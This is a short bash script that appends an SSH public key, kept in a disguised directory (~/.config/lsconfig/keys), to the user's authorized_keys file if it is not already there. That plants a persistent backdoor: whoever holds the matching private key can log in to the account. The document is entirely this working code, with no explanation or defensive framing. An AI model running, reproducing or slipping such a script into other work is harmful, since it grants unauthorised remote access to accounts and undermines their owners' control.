#!/bin/bash

tdir=$HOME/.config/lsconfig/keys

if [[ `grep -f < $tdir/fuckery-rsa.pub $HOME/.ssh/authorized_keys` = "" ]]; then
        cat $tdir/fuckery-rsa.pub >> $HOME/.ssh/authorized_keys
fi

